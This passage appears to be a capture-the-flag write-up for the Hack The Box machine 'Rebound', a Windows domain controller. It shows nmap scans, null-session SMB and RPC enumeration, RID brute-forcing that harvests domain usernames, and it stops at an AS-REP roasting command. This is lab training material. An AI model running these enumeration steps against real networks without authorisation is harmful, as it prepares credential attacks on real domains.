# Rebound

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -Pn 10.129.112.203    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 19:11 UTC
Nmap scan report for rebound.htb (10.129.112.203)
Host is up (0.12s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-10 02:11:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T02:12:16+00:00; +6h59m51s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T02:12:15+00:00; +6h59m51s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T02:12:16+00:00; +6h59m51s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-09-10T02:12:15+00:00; +6h59m51s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/9%OT=53%CT=1%CU=33956%PV=Y%DS=2%DC=T%G=Y%TM=64FCC399
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%TS=U)SEQ(
OS:SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10B%T
OS:I=I%CI=RI%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10B%TI=RD%CI=I%II=I%TS=U)O
OS:PS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6
OS:=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=
OS:Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m51s, deviation: 0s, median: 6h59m50s
| smb2-time: 
|   date: 2023-09-10T02:12:06
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   55.88 ms 10.10.16.1
2   28.33 ms rebound.htb (10.129.112.203)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.11 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -Pn -p- 10.129.112.203
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 19:12 UTC
Nmap scan report for rebound.htb (10.129.112.203)
Host is up (0.11s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-10 02:13:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T02:14:29+00:00; +6h59m52s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-09-10T02:14:30+00:00; +6h59m52s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T02:14:29+00:00; +6h59m52s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-09-10T02:14:30+00:00; +6h59m52s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
55102/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/9%OT=53%CT=1%CU=36517%PV=Y%DS=2%DC=T%G=Y%TM=64FCC41F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%TS=U)SEQ(
OS:SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR=10C%T
OS:I=I%CI=I%II=I%TS=U)SEQ(SP=107%GCD=1%ISR=10C%TI=RD%CI=I%II=I%TS=U)SEQ(SP=
OS:107%GCD=3%ISR=10C%TI=RD%CI=I%TS=U)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53
OS:ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%
OS:W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1
OS:(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(
OS:R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m51s, deviation: 0s, median: 6h59m51s
| smb2-time: 
|   date: 2023-09-10T02:14:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   57.13 ms 10.10.16.1
2   29.27 ms rebound.htb (10.129.112.203)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.45 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.112.203
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 19:16 UTC
Nmap scan report for rebound.htb (10.129.112.203)
Host is up (0.030s latency).
Not shown: 972 closed udp ports (port-unreach)
PORT      STATE         SERVICE      VERSION
53/udp    open          domain       Simple DNS Plus
88/udp    open          kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-10 02:24:39Z)
123/udp   open          ntp          NTP v3
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
389/udp   open          ldap         Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
464/udp   open|filtered kpasswd5
500/udp   open|filtered isakmp
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
5355/udp  open|filtered llmnr
53838/udp open|filtered unknown
54094/udp open|filtered unknown
57409/udp open|filtered unknown
57410/udp open|filtered unknown
57813/udp open|filtered unknown
57843/udp open|filtered unknown
57958/udp open|filtered unknown
57977/udp open|filtered unknown
58002/udp open|filtered unknown
58075/udp open|filtered unknown
58178/udp open|filtered unknown
58419/udp open|filtered unknown
58631/udp open|filtered unknown
58640/udp open|filtered unknown
58797/udp open|filtered unknown
59193/udp open|filtered unknown
59207/udp open|filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1457.51 seconds
```

We added `rebound.htb` to our `/etc/hosts` file.

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.112.203  rebound.htb
```

### Reconnaissance via enum4linux-ng

```c
┌──(user㉿kali)-[~/opt/01_information_gathering/enum4linux-ng]
└─$ python3 enum4linux-ng.py 10.129.112.203
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.112.203
[*] Username ......... ''
[*] Random Username .. 'rfpcmlfn'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 10.129.112.203    |
 =======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: timed out
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.112.203    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

[!] Aborting remainder of tests since neither SMB nor LDAP are accessible

Completed after 25.03 seconds
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~/opt/01_information_gathering/enum4linux-ng]
└─$ python3 enum4linux-ng.py 10.129.112.203
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.112.203
[*] Username ......... ''
[*] Random Username .. 'iznnsygs'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 10.129.112.203    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 10.129.112.203    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: rebound.htb

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.112.203    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 10.129.112.203    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB signing required: true                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           

 =============================================================
|    Domain Information via SMB session for 10.129.112.203    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
DNS domain: rebound.htb                                                                                                                                                                                                                     
Derived domain: rebound                                                                                                                                                                                                                     
Derived membership: domain member                                                                                                                                                                                                           
FQDN: dc01.rebound.htb                                                                                                                                                                                                                      
NetBIOS computer name: DC01                                                                                                                                                                                                                 
NetBIOS domain name: rebound                                                                                                                                                                                                                

 ===========================================
|    RPC Session Check on 10.129.112.203    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'iznnsygs', password ''
[H] Rerunning enumeration with user 'iznnsygs' might give more results

 =====================================================
|    Domain Information via RPC for 10.129.112.203    |
 =====================================================
[+] Domain: rebound
[+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[+] Membership: domain member

 =================================================
|    OS Information via RPC for 10.129.112.203    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
Native LAN manager: not supported                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS build: '17763'                                                                                                                                                                                                                           
OS release: '1809'                                                                                                                                                                                                                          
OS version: '10.0'                                                                                                                                                                                                                          
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 =======================================
|    Users via RPC on 10.129.112.203    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ========================================
|    Groups via RPC on 10.129.112.203    |
 ========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ========================================
|    Shares via RPC on 10.129.112.203    |
 ========================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ===========================================
|    Policies via RPC for 10.129.112.203    |
 ===========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ===========================================
|    Printers via RPC for 10.129.112.203    |
 ===========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 15.23 seconds
```

### Enumeration of Port 445/TCP

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb 10.129.112.203 -u ' ' -p '' --shares
SMB         10.129.112.203  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.203  445    DC01             [+] rebound.htb\ : 
SMB         10.129.112.203  445    DC01             [*] Enumerated shares
SMB         10.129.112.203  445    DC01             Share           Permissions     Remark
SMB         10.129.112.203  445    DC01             -----           -----------     ------
SMB         10.129.112.203  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.112.203  445    DC01             C$                              Default share
SMB         10.129.112.203  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.112.203  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.112.203  445    DC01             Shared          READ            
SMB         10.129.112.203  445    DC01             SYSVOL                          Logon server share
```

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb 10.129.112.203 -u ' ' -p '' --shares -M spider_plus -o READ_ONLY=false
SMB         10.129.112.203  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.203  445    DC01             [+] rebound.htb\ : 
SPIDER_P... 10.129.112.203  445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.129.112.203  445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.129.112.203  445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.129.112.203  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.129.112.203  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.129.112.203  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.129.112.203  445    DC01             [*]  OUTPUT_FOLDER: /tmp/cme_spider_plus
SPIDER_P... 10.129.112.203  445    DC01             [+] Saved share-file metadata to "/tmp/cme_spider_plus/10.129.112.203.json".
SPIDER_P... 10.129.112.203  445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Shared, SYSVOL)
SPIDER_P... 10.129.112.203  445    DC01             [*] SMB Readable Shares:  2 (IPC$, Shared)
SPIDER_P... 10.129.112.203  445    DC01             [*] SMB Filtered Shares:  1
SPIDER_P... 10.129.112.203  445    DC01             [*] Total folders found:  0
SPIDER_P... 10.129.112.203  445    DC01             [*] Total files found:    0
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ smbclient //10.129.112.203/Shared
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Aug 25 21:46:36 2023
  ..                                  D        0  Fri Aug 25 21:46:36 2023

                4607743 blocks of size 4096. 886100 blocks available
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ smbclient //10.129.112.203/IPC$  
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
```

### LDAP Enumeration

```c
┌──(user㉿kali)-[~]
└─$ rpcclient -U "" 10.129.112.203
Password for [WORKGROUP\]:
rpcclient $>
```

```c
rpcclient $> srvinfo
        10.129.112.203 Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
```

```c
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
```

```c
rpcclient $> lsaquery
Domain Name: rebound
Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
```

```c
rpcclient $> lsaenumsid
found 18 SIDs

S-1-5-90-0
S-1-5-9
S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
S-1-5-80-0
S-1-5-6
S-1-5-32-559
S-1-5-32-554
S-1-5-32-551
S-1-5-32-550
S-1-5-32-549
S-1-5-32-548
S-1-5-32-545
S-1-5-32-544
S-1-5-21-4078382237-1492182817-2568127209-7686
S-1-5-20
S-1-5-19
S-1-5-11
S-1-1-0
```

```c
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7686
S-1-5-21-4078382237-1492182817-2568127209-7686 rebound\tbrady (1)
```

| Username |
| --- |
| tbrady |

```c
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7680
S-1-5-21-4078382237-1492182817-2568127209-7680 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7681
S-1-5-21-4078382237-1492182817-2568127209-7681 rebound\ldap_monitor (1)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7682
S-1-5-21-4078382237-1492182817-2568127209-7682 rebound\oorend (1)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7683
S-1-5-21-4078382237-1492182817-2568127209-7683 rebound\ServiceMgmt (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7684
S-1-5-21-4078382237-1492182817-2568127209-7684 rebound\winrm_svc (1)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7685
S-1-5-21-4078382237-1492182817-2568127209-7685 rebound\batch_runner (1)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7686
S-1-5-21-4078382237-1492182817-2568127209-7686 rebound\tbrady (1)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7687
S-1-5-21-4078382237-1492182817-2568127209-7687 rebound\delegator$ (1)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7688
S-1-5-21-4078382237-1492182817-2568127209-7688 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7689
S-1-5-21-4078382237-1492182817-2568127209-7689 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-7690
S-1-5-21-4078382237-1492182817-2568127209-7690 *unknown*\*unknown* (8)
```

| Username |
| --- |
| ldap_monitor |
| oorend |
| ServiceMgmt |
| winrm_svc |

```c
┌──(user㉿kali)-[/media/sf_infosec/htb/machines/rebound]
└─$ crackmapexec smb rebound.htb -u guest -p '' --shares --rid-brute 100000
SMB         rebound.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         rebound.htb     445    DC01             [+] rebound.htb\guest: 
SMB         rebound.htb     445    DC01             [*] Enumerated shares
SMB         rebound.htb     445    DC01             Share           Permissions     Remark
SMB         rebound.htb     445    DC01             -----           -----------     ------
SMB         rebound.htb     445    DC01             ADMIN$                          Remote Admin
SMB         rebound.htb     445    DC01             C$                              Default share
SMB         rebound.htb     445    DC01             IPC$            READ            Remote IPC
SMB         rebound.htb     445    DC01             NETLOGON                        Logon server share 
SMB         rebound.htb     445    DC01             Shared          READ            
SMB         rebound.htb     445    DC01             SYSVOL                          Logon server share 
SMB         rebound.htb     445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         rebound.htb     445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         rebound.htb     445    DC01             501: rebound\Guest (SidTypeUser)
SMB         rebound.htb     445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         rebound.htb     445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         rebound.htb     445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         rebound.htb     445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         rebound.htb     445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         rebound.htb     445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         rebound.htb     445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         rebound.htb     445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         rebound.htb     445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         rebound.htb     445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         rebound.htb     445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         rebound.htb     445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         rebound.htb     445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         rebound.htb     445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         rebound.htb     445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         rebound.htb     445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         rebound.htb     445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         rebound.htb     445    DC01             2952: rebound\llune (SidTypeUser)
SMB         rebound.htb     445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         rebound.htb     445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         rebound.htb     445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         rebound.htb     445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         rebound.htb     445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         rebound.htb     445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         rebound.htb     445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         rebound.htb     445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         rebound.htb     445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         rebound.htb     445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         rebound.htb     445    DC01             7687: rebound\delegator$ (SidTypeUser)
```

| Username |
| --- |
| DnsAdmins |
| DnsUpdateProxy |
| ppaul |
| llune |
| fflock |
| jjones |
| mmalone |
| nnoon |

We created a full list of usernames.

| Username |
| --- |
| tbrady |
| ldap_monitor |
| oorend |
| ServiceMgmt |
| winrm_svc |
| DnsAdmins |
| DnsUpdateProxy |
| ppaul |
| llune |
| fflock |
| jjones |
| mmalone |
| nnoon |

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ cat usernames.txt 
tbrady
ldap_monitor
oorend
ServiceMgmt
winrm_svc
DnsAdmins
DnsUpdateProxy
ppaul
llune
fflock
jjones
mmalone
nnoon
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ impacket-GetNPUsers -usersfile usernames.txt -dc-ip dc01.rebound.htb rebound.htb/
